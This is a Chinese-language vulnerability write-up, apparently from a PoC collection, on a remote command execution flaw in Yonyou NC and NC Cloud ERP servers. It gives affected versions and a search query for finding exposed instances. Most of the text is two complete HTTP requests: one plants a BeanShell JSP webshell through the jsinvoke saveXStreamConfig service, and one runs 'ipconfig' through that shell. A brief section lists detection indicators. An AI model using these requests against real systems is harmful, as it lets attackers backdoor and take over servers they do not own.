# 用友NC Cloud存在前台远程命令执行漏洞

## 漏洞描述

用友NC及NC Cloud系统存在任意文件上传漏洞，攻击者可通过uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给NC服务器预埋后门，从而可以随意操作服务器。

## 影响范围

- NC63、NC633、NC65
- NC Cloud1903、NC Cloud1909
- NC Cloud2005、NC Cloud2105、NC Cloud2111
- YonBIP 高级版 2207

网络空间测绘语法：app="用友-NC-Cloud"

## 漏洞复现

poc：上传823780482.jsp的webshell

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded
 
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/823780482.jsp"]}
```

poc：执行ipconfig命令

```
POST /823780482.jsp?error=bsh.Interpreter HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
 
cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
```

## 分析研判

分析主要从请求方法、请求URL路径、请求内容及返回内容方面进行。

- POST请求方法
- 请求路径"/uapjs/jsinvoke?action=invoke"
- 请求内容"getRuntime().exec"、"saveXStreamConfig"
- 结合响应状态码200、内容body信息

## 参考链接

用友NC Cloud存在前台远程命令执行漏洞 附POC软件

<https://blog.csdn.net/nnn2188185/article/details/131894129>

用友NC uapjs RCE漏洞

<https://cn-sec.com/archives/1894623.html>
